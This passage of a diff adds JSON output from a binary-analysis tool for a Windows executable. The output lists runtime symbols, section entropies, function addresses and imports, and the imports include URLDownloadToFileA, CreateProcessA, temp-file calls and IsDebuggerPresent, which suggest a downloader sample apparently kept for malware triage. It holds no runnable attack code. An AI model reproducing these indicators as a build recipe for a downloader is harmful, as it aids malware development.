+          "ea": 4200,
+          "name": "_exit",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 4212,
+          "name": "_cexit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 4228,
+          "name": "_c_exit",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 4244,
+          "name": "_amsg_exit",
+          "type": "DEBUG",
+          "num_refs": 10
+        },
+        {
+          "ea": 4284,
+          "name": "_GET_RTERRMSG",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 4328,
+          "name": "_NMSG_WRITE",
+          "type": "DEBUG",
+          "num_refs": 8
+        },
+        {
+          "ea": 4936,
+          "name": "_FF_MSGBANNER",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
+          "ea": 5004,
+          "name": "__C_specific_handler",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 5516,
+          "name": "_XcptFilter",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 5980,
+          "name": "_wincmdln",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 6104,
+          "name": "_setenvp",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 6408,
+          "name": "parse_cmdline",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 6872,
+          "name": "_setargv",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 7120,
+          "name": "__crtGetEnvironmentStringsA",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 7364,
+          "name": "_ioinit",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 8212,
+          "name": "_mtterm",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 8252,
+          "name": "_initptd",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 8436,
+          "name": "_getptd_noexit",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 8568,
+          "name": "_getptd",
+          "type": "DEBUG",
+          "num_refs": 8
+        },
+        {
+          "ea": 8604,
+          "name": "_freefls",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 8912,
+          "name": "_mtinit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9044,
+          "name": "_heap_init",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9132,
+          "name": "__security_init_cookie",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9320,
+          "name": "terminate",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 9356,
+          "name": "_initp_eh_hooks",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9388,
+          "name": "_mtinitlocks",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9520,
+          "name": "_mtdeletelocks",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 9656,
+          "name": "_unlock",
+          "type": "DEBUG",
+          "num_refs": 17
+        },
+        {
+          "ea": 9680,
+          "name": "_mtinitlocknum",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 9912,
+          "name": "_lock",
+          "type": "DEBUG",
+          "num_refs": 12
+        },
+        {
+          "ea": 10028,
+          "name": "raise",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 10616,
+          "name": "_call_reportfault",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 10948,
+          "name": "_invoke_watson",
+          "type": "DEBUG",
+          "num_refs": 8
+        },
+        {
+          "ea": 11000,
+          "name": "_invalid_parameter",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 11112,
+          "name": "_invalid_parameter_noinfo",
+          "type": "DEBUG",
+          "num_refs": 8
+        },
+        {
+          "ea": 11152,
+          "name": "_callnewh",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
+          "ea": 11204,
+          "name": "_get_errno_from_oserr",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 11276,
+          "name": "_errno",
+          "type": "DEBUG",
+          "num_refs": 23
+        },
+        {
+          "ea": 11308,
+          "name": "__onexitinit",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 11376,
+          "name": "_onexit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 11644,
+          "name": "atexit",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 11668,
+          "name": "_initp_misc_cfltcvt_tab",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 11728,
+          "name": "_ValidateImageBase",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 11776,
+          "name": "_FindPESection",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 11856,
+          "name": "_IsNonwritableInCurrentImage",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 11924,
+          "name": "__GSHandlerCheckCommon",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 12024,
+          "name": "__GSHandlerCheck",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 12080,
+          "name": "strlen",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 12768,
+          "name": "wcscat_s",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 12904,
+          "name": "wcsncpy_s",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 13112,
+          "name": "wcslen",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 13140,
+          "name": "wcscpy_s",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 13248,
+          "name": "_set_error_mode",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 13428,
+          "name": "_LocaleUpdate._LocaleUpdate",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 13592,
+          "name": "x_ismbbtype_l",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 13716,
+          "name": "_ismbblead",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 13736,
+          "name": "setSBCS",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 13876,
+          "name": "setSBUpLow",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 14372,
+          "name": "__updatetmbcinfo",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 14560,
+          "name": "getSystemCP",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 14704,
+          "name": "_setmbcp_nolock",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 15336,
+          "name": "_setmbcp",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 15816,
+          "name": "__initmbctable",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 15856,
+          "name": "free",
+          "type": "DEBUG",
+          "num_refs": 143
+        },
+        {
+          "ea": 15920,
+          "name": "strcpy_s",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 16020,
+          "name": "_malloc_crt",
+          "type": "DEBUG",
+          "num_refs": 5
+        },
+        {
+          "ea": 16416,
+          "name": "__addlocaleref",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 16556,
+          "name": "__removelocaleref",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 16720,
+          "name": "__freetlocinfo",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 17100,
+          "name": "_updatetlocinfoEx_nolock",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 17188,
+          "name": "__updatetlocinfo",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 17308,
+          "name": "abort",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 17392,
+          "name": "memmove",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 18240,
+          "name": "memset",
+          "type": "DEBUG",
+          "num_refs": 11
+        },
+        {
+          "ea": 18476,
+          "name": "_msize",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 18536,
+          "name": "_fptrap",
+          "type": "DEBUG",
+          "num_refs": 11
+        },
+        {
+          "ea": 18548,
+          "name": "__crtLCMapStringA_stat",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 19264,
+          "name": "__crtLCMapStringA",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 19416,
+          "name": "__crtGetStringTypeA_stat",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 19768,
+          "name": "__crtGetStringTypeA",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 19896,
+          "name": "malloc",
+          "type": "DEBUG",
+          "num_refs": 6
+        },
+        {
+          "ea": 20080,
+          "name": "_calloc_impl",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 20236,
+          "name": "realloc",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 20448,
+          "name": "__free_lc_time",
+          "type": "DEBUG",
+          "num_refs": 2
+        },
+        {
+          "ea": 21564,
+          "name": "__free_lconv_mon",
+          "type": "DEBUG",
+          "num_refs": 3
+        },
+        {
+          "ea": 21856,
+          "name": "_alloca_probe",
+          "type": "DEBUG",
+          "num_refs": 4
+        },
+        {
+          "ea": 22160,
+          "name": "_IsNonwritableInCurrentImage$filt$0",
+          "type": "DEBUG",
+          "num_refs": 1
+        },
+        {
+          "ea": 25600,
+          "name": "kernel32.CreateProcessA",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 25608,
+          "name": "kernel32.GetTempFileNameA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25616,
+          "name": "kernel32.IsDebuggerPresent",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 25624,
+          "name": "kernel32.GetTempPathA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25632,
+          "name": "kernel32.HeapAlloc",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25640,
+          "name": "kernel32.GetStringTypeW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25648,
+          "name": "kernel32.GetCommandLineA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25656,
+          "name": "kernel32.GetStartupInfoW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25664,
+          "name": "kernel32.TerminateProcess",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25672,
+          "name": "kernel32.GetCurrentProcess",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25680,
+          "name": "kernel32.UnhandledExceptionFilter",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25688,
+          "name": "kernel32.SetUnhandledExceptionFilter",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 25696,
+          "name": "kernel32.RtlVirtualUnwind",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25704,
+          "name": "kernel32.RtlLookupFunctionEntry",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25712,
+          "name": "kernel32.RtlCaptureContext",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25720,
+          "name": "kernel32.GetProcAddress",
+          "type": "IMPORT",
+          "num_refs": 6
+        },
+        {
+          "ea": 25728,
+          "name": "kernel32.GetModuleHandleW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25736,
+          "name": "kernel32.ExitProcess",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25744,
+          "name": "kernel32.DecodePointer",
+          "type": "IMPORT",
+          "num_refs": 16
+        },
+        {
+          "ea": 25752,
+          "name": "kernel32.WriteFile",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25760,
+          "name": "kernel32.GetStdHandle",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25768,
+          "name": "kernel32.GetModuleFileNameW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25776,
+          "name": "kernel32.RtlUnwindEx",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25784,
+          "name": "kernel32.GetModuleFileNameA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25792,
+          "name": "kernel32.FreeEnvironmentStringsW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25800,
+          "name": "kernel32.WideCharToMultiByte",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 25808,
+          "name": "kernel32.GetEnvironmentStringsW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25816,
+          "name": "kernel32.SetHandleCount",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25824,
+          "name": "kernel32.InitializeCriticalSectionAndSpinCount",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 25832,
+          "name": "kernel32.GetFileType",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25840,
+          "name": "kernel32.DeleteCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25848,
+          "name": "kernel32.EncodePointer",
+          "type": "IMPORT",
+          "num_refs": 12
+        },
+        {
+          "ea": 25856,
+          "name": "kernel32.FlsGetValue",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25864,
+          "name": "kernel32.FlsSetValue",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 25872,
+          "name": "kernel32.FlsFree",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25880,
+          "name": "kernel32.SetLastError",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25888,
+          "name": "kernel32.GetCurrentThreadId",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 25896,
+          "name": "kernel32.GetLastError",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 25904,
+          "name": "kernel32.FlsAlloc",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25912,
+          "name": "kernel32.HeapSetInformation",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25920,
+          "name": "kernel32.GetVersion",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25928,
+          "name": "kernel32.HeapCreate",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25936,
+          "name": "kernel32.QueryPerformanceCounter",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25944,
+          "name": "kernel32.GetTickCount",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25952,
+          "name": "kernel32.GetCurrentProcessId",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25960,
+          "name": "kernel32.GetSystemTimeAsFileTime",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25968,
+          "name": "kernel32.LeaveCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 25976,
+          "name": "kernel32.EnterCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25984,
+          "name": "kernel32.LoadLibraryW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 25992,
+          "name": "kernel32.GetCPInfo",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 26000,
+          "name": "kernel32.GetACP",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26008,
+          "name": "kernel32.GetOEMCP",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26016,
+          "name": "kernel32.IsValidCodePage",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26024,
+          "name": "kernel32.HeapFree",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26032,
+          "name": "kernel32.Sleep",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 26040,
+          "name": "kernel32.HeapSize",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26048,
+          "name": "kernel32.LCMapStringW",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 26056,
+          "name": "kernel32.MultiByteToWideChar",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 26064,
+          "name": "kernel32.HeapReAlloc",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 26080,
+          "name": "urlmon.URLDownloadToFileA",
+          "type": "IMPORT",
+          "num_refs": 2
+        }
+      ],
+      "sections": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1024,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 45
+        },
+        {
+          "name": ".text",
+          "effective_address": 1024,
+          "physical_size": 21504,
+          "virtual_size": 24576,
+          "rights": "RX",
+          "entropy": 129
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 25600,
+          "physical_size": 10240,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 56
+        },
+        {
+          "name": ".data",
+          "effective_address": 37888,
+          "physical_size": 4096,
+          "virtual_size": 12288,
+          "rights": "RW",
+          "entropy": 82
+        },
+        {
+          "name": ".pdata",
+          "effective_address": 50176,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 15
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 54272,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 37
+        }
+      ],
+      "entropy": {
+        "file_entropy": 5.54,
+        "regions": [
+          {
+            "name": "header",
+            "entropy": 45,
+            "size": null
+          },
+          {
+            "name": ".text",
+            "entropy": 129,
+            "size": null
+          },
+          {
+            "name": ".rdata",
+            "entropy": 56,
+            "size": null
+          },
+          {
+            "name": ".data",
+            "entropy": 82,
+            "size": null
+          },
+          {
+            "name": ".pdata",
+            "entropy": 15,
+            "size": null
+          },
+          {
+            "name": ".reloc",
+            "entropy": 37,
+            "size": null
+          }
+        ],
+        "file_entropy_malcat_raw": 104,
+        "entropy_source": "whole_file_shannon_revai"
+      },
+      "functions": [
+        {
+          "ea": 13376,
+          "name": "sub_140004040"
+        },
+        {
+          "ea": 1024,
+          "name": "sub_140001000"
+        },
+        {
+          "ea": 12248,
+          "name": "sub_140003bd8"
+        },
+        {
+          "ea": 3384,
+          "name": "sub_140001938"
+        },
+        {
+          "ea": 22077,
+          "name": "sub_14000623d"
+        },
+        {
+          "ea": 8200,
+          "name": "sub_140002c08"
+        },
+        {
+          "ea": 10012,
+          "name": "sub_14000331c"
+        },
+        {
+          "ea": 21934,
+          "name": "jmp_kernel32.RtlVirtualUnwind"
+        },
+        {
+          "ea": 21940,
+          "name": "jmp_kernel32.RtlLookupFunctionEntry"
+        },
+        {
+          "ea": 21946,
+          "name": "jmp_kernel32.RtlUnwindEx"
+        },
+        {
+          "ea": 8088,
+          "name": "sub_140002b98"
+        },
+        {
+          "ea": 8144,
+          "name": "sub_140002bd0"
+        },
+        {
+          "ea": 13328,
+          "name": "sub_140004010"
+        },
+        {
+          "ea": 21982,
+          "name": "sub_1400061de"
+        },
+        {
+          "ea": 22018,
+          "name": "sub_140006202"
+        },
+        {
+          "ea": 22050,
+          "name": "sub_140006222"
+        },
+        {
+          "ea": 22194,
+          "name": "sub_1400062b2"
+        },
+        {
+          "ea": 22221,
+          "name": "sub_1400062cd"
+        },
+        {
+          "ea": 21456,
+          "name": "sub_140005fd0"
+        },
+        {
+          "ea": 21952,
+          "name": "sub_1400061c0"
+        },
+        {
+          "ea": 22107,
+          "name": "sub_14000625b"
+        },
+        {
+          "ea": 22137,
+          "name": "sub_140006279"
+        },
+        {
+          "ea": 9312,
+          "name": "sub_140003060"
+        },
+        {
+          "ea": 1600,
+          "name": "sub_140001240"
+        },
+        {
+          "ea": 4188,
+          "name": "sub_140001c5c"
+        },
+        {
+          "ea": 10592,
+          "name": "sub_140003560"
+        },
+        {
+          "ea": 10600,
+          "name": "sub_140003568"
+        },
+        {
+          "ea": 10608,
+          "name": "sub_140003570"
+        },
+        {
+          "ea": 11144,
+          "name": "sub_140003788"
+        },
+        {
+          "ea": 13424,
+          "name": "sub_140004070"
+        }
+      ],
+      "constants": [
+        {
+          "id": "exception::C++ exception",
+          "category": "exception",
+          "type": "code",
+          "num_hits": 2
+        },
+        {
+          "id": "exception::FuncInfo header",
+          "category": "exception",
+          "type": "code",
+          "num_hits": 4
+        },
+        {
+          "id": "runtime::msvc_tloss_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_sing_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_domain_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6033",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6032",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6031",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6030",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6028",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6027",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6026",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6025",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6024",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6019",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6018",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6017",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6016",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6010",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6009",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6008",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6002",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_rl",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_name_unknown",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_runtime_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        }
+      ],
+      "carved": [],
+      "virtual_files": [],
+      "structures": [
+        {
+          "name": "MZ",
+          "ea": 0
+        },
+        {
+          "name": "RichHeader",
+          "ea": 128
+        },
+        {
+          "name": "PE",
+          "ea": 224
+        },
+        {
+          "name": "OptionalHeader",
+          "ea": 248
+        },
+        {
+          "name": "Sections",
+          "ea": 488
+        },
+        {
+          "name": "kernel32.FT",
+          "ea": 25600
+        },
+        {
+          "name": "urlmon.FT",
+          "ea": 26080
+        },
+        {
+          "name": "ImportTable",
+          "ea": 33676
+        },
+        {
+          "name": "kernel32.OFT",
+          "ea": 33736
+        },
+        {
+          "name": "urlmon.OFT",
+          "ea": 34216
+        },
+        {
+          "name": "ImportNames",
+          "ea": 34232
+        },
+        {
+          "name": "ExceptionTable",
+          "ea": 50176
+        },
+        {
+          "name": "Relocations",
+          "ea": 54272
+        }
+      ]
+    },
+    "functions": [
+      {
+        "ea": 13376,
+        "name": "sub_140004040"
+      },
+      {
+        "ea": 1024,
+        "name": "sub_140001000"
+      },
+      {
+        "ea": 12248,
+        "name": "sub_140003bd8"
+      },
+      {
+        "ea": 3384,
+        "name": "sub_140001938"
+      },
+      {
+        "ea": 22077,
+        "name": "sub_14000623d"
+      },
+      {
+        "ea": 8200,
+        "name": "sub_140002c08"
+      },
+      {
+        "ea": 10012,
+        "name": "sub_14000331c"
+      },
+      {
+        "ea": 21934,
+        "name": "jmp_kernel32.RtlVirtualUnwind"
+      },
+      {
+        "ea": 21940,
+        "name": "jmp_kernel32.RtlLookupFunctionEntry"
+      },
+      {
+        "ea": 21946,
+        "name": "jmp_kernel32.RtlUnwindEx"
+      },
+      {
+        "ea": 8088,
+        "name": "sub_140002b98"
+      },
+      {
+        "ea": 8144,
+        "name": "sub_140002bd0"
+      },
+      {
+        "ea": 13328,
+        "name": "sub_140004010"
+      },
+      {
+        "ea": 21982,
+        "name": "sub_1400061de"
+      },
+      {
+        "ea": 22018,
+        "name": "sub_140006202"
+      },
+      {
+        "ea": 22050,
+        "name": "sub_140006222"
+      },
+      {
+        "ea": 22194,
+        "name": "sub_1400062b2"
+      },
+      {
+        "ea": 22221,
+        "name": "sub_1400062cd"
+      },
+      {
+        "ea": 21456,
+        "name": "sub_140005fd0"
+      },
+      {
+        "ea": 21952,
+        "name": "sub_1400061c0"
+      },
+      {
+        "ea": 22107,
+        "name": "sub_14000625b"
+      },
+      {
+        "ea": 22137,
+        "name": "sub_140006279"
+      },
+      {
+        "ea": 9312,
+        "name": "sub_140003060"
+      },
+      {
+        "ea": 1600,
+        "name": "sub_140001240"
+      },
+      {
+        "ea": 4188,
+        "name": "sub_140001c5c"
+      },
+      {
+        "ea": 10592,
+        "name": "sub_140003560"
+      },
+      {
+        "ea": 10600,
+        "name": "sub_140003568"
+      },
+      {
+        "ea": 10608,
+        "name": "sub_140003570"
+      },
+      {
+        "ea": 11144,
+        "name": "sub_140003788"
+      },
+      {
+        "ea": 13424,
+        "name": "sub_140004070"
+      }
+    ],
+    "constants": [
+      {
+        "id": "exception::C++ exception",
+        "category": "exception",
+        "type": "code",
+        "num_hits": 2
+      },
+      {
+        "id": "exception::FuncInfo header",
+        "category": "exception",
+        "type": "code",
+        "num_hits": 4
+      },
+      {
+        "id": "runtime::msvc_tloss_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_sing_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_domain_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6033",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6032",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6031",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6030",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6028",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6027",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6026",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6025",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6024",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6019",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6018",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6017",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6016",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6010",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6009",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6008",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
